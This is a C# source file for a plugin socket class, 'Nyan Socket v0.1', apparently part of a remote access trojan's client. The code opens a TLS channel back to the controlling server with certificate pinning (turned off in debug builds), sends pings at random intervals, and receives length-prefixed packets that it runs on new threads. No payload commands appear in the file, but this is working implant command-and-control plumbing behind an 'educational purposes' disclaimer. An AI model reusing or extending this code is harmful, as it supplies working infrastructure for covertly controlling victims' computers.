﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Security.Principal;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using Plugin.MessagePack;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Plugin
{
    public class TempSocket
    {
        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        private byte[] Buffer { get; set; }
        private long Buffersize { get; set; }
        private MemoryStream MS { get; set; }
        public bool IsConnected { get; set; }
        private object SendSync { get; } = new object();
        private static Timer Tick { get; set; }


        public TempSocket()
        {
            if (!Connection.IsConnected) return;

            try
            {
                TcpClient = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[1]));

                Debug.WriteLine("Temp Connected!");
                IsConnected = true;
                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                Buffer = new byte[4];
                MS = new MemoryStream();
                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Temp Disconnected!");
                Dispose();
                IsConnected = false;
            }
        }

        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Connection.ServerCertificate.Equals(certificate);
        }

        public void Dispose()
        {
            IsConnected = false;

            try
            {
                TcpClient.Shutdown(SocketShutdown.Both);
            }
            catch { }

            try
            {
                Tick?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                MS?.Dispose();
            }
            catch { }
        }

        public void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!Connection.IsConnected || !IsConnected)
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    if (MS.Length == 4)
                    {
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            while (MS.Length != Buffersize)
                            {
                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
                                if (rc == 0)
                                {
                                    IsConnected = false;
                                    Dispose();
                                    return;
                                }
                                MS.Write(Buffer, 0, rc);
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(MS.ToArray());
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                        }
                    }
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                Dispose();
                return;
            }
        }

        public void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || !Connection.IsConnected)
                    {
                        Dispose();
                        return;
                    }
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        int chunkSize = 50 * 1024;
                        byte[] chunk = new byte[chunkSize];
                        using (MemoryStream buffereReader = new MemoryStream(msg))
                        {
                            BinaryReader binaryReader = new BinaryReader(buffereReader);
                            int bytesToRead = (int)buffereReader.Length;
                            do
                            {
                                chunk = binaryReader.ReadBytes(chunkSize);
                                bytesToRead -= chunkSize;
                                SslClient.Write(chunk, 0, chunk.Length);
                                SslClient.Flush();
                            } while (bytesToRead > 0);

                            binaryReader.Dispose();
                        }
                    }
                    else
                    {
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
        }

        public void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = "";
            Send(msgpack.Encode2Bytes());
        }
    }
}